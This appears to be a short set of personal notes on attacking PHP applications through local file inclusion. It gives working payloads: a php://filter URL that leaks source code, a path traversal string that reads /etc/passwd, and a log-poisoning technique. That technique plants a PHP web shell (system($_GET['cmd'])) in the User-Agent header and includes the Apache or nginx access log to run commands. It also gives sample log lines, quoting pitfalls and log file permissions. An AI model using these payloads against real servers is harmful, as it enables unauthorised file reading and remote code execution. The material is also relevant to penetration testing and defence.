## 1
php_base64_LFI:
`http://xxxxxxxx?page=php://filter/convert.base64-encode/resource=xxxxx.php`

LFI:
/aaa/bbb/ccc/../../../../../etc/passwd, (ccc should be a directory)

## 2
php RCE in apache/nginx log:
```shell
"User-Agent: <?php system($_GET['cmd']); ?>"

# logs file
"User-Agent: <?php echo 'MMM'; ?>"
127.0.0.1 - - [02/Apr/2023:20:00:51 +0530] "GET /detail.php?page=/var/log/apache2/access.log HTTP/1.1" 500 1800 "-" "<?php echo 'MMM'; ?>"

"User-Agent: <?php echo "MMM"; ?>"
# will cause error
# apache2:
127.0.0.1- - [02/Apr/2023:20:00:59 +0530] "GET /detail.php?page=/var/log/apache2/access.log HTTP/1.1" 500 1800 "-" "<?php echo \"MMM\"; ?>"
# nginx
127.0.0.1 - - [02/Apr/2023:10:36:40 -0400] "GET / HTTP/1.1" 200 3437 "-" "<?php echo \x22MMM\x22; ?>"
```
1. do not use double quotes`($_GET['cmd'])`, or it will break the machine


works: php `include` function

does not work: see sample/home.php(XXE attack)

```shell
# nginx log default permission
-rw-r----- 1 www-data adm 0 Apr  2 00:00 access.log

# apache2 log default permission
-rw-r----- 1 root adm 0 Mar  5 00:00 access.log
```

## 3
By default, file_get_contents can get remote resources("http://...) while include cannot get remote resources. To enable it, set allow_url_include=1 in php.ini file